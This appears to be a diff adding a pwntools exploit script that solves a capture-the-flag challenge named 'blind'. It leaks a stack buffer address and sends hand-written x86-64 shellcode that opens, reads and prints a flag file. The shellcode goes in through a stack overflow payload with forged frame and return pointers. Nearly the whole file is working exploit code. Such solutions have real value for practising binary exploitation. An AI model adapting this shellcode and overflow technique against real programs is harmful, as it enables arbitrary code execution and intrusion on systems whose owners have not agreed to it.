@@ -1,0 +1,37 @@
+from pwn import *
+
+e = ELF("./blind_patched")
+libc = ELF("./libc.so.6")
+ld = ELF("./ld-linux-x86-64.so.2")
+
+script = '''
+b *vuln
+b *0x401446
+'''
+
+HOST = "24ffcbe7e96963b93d7e8be34a830068.chal.ctf.ae"
+
+#p = remote(HOST, 443, ssl = True, sni = HOST)
+
+p = process("./blind_patched")
+#p = gdb.debug("./blind_patched", gdbscript = script)
+
+p.recvuntil(b"Buffer: ")
+buf = int(p.recvline()[:-1:], 16)
+print(hex(buf), "????")
+
+shellcode = b"\x68\x78\x74\x00\x00\x48\xB8\x2E\x2F\x66\x6C\x61\x67\x2E\x74\x50\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\x48\xC7\xC0\x02\x00\x00\x00\x0F\x05\x48\x89\xC7\x48\xC7\xC6\x00\x48\x40\x00\x48\x83\xEE\x30\x48\xC7\xC2\x30\x00\x00\x00\x48\xC7\xC0\x00\x00\x00\x00\x0F\x05\x48\xC7\xC7\x02\x00\x00\x00\x48\xC7\xC0\x01\x00\x00\x00\x0F\x05"
+
+
+payload = shellcode.ljust(0x78, b"\x00")
+payload += b"A" * 8
+payload += p64(buf + 0x80) + p64(buf)
+payload += b"A" * (0x890 - len(payload))
+payload += p64(buf + 0x880)
+payload += b"A" * (0x8a8 - len(payload))
+payload += b"A" * 8
+
+p.sendlineafter(b"shellcode: ", f"{len(payload)}".encode())
+p.sendafter(b"Escape> ", payload)
+
+p.interactive()
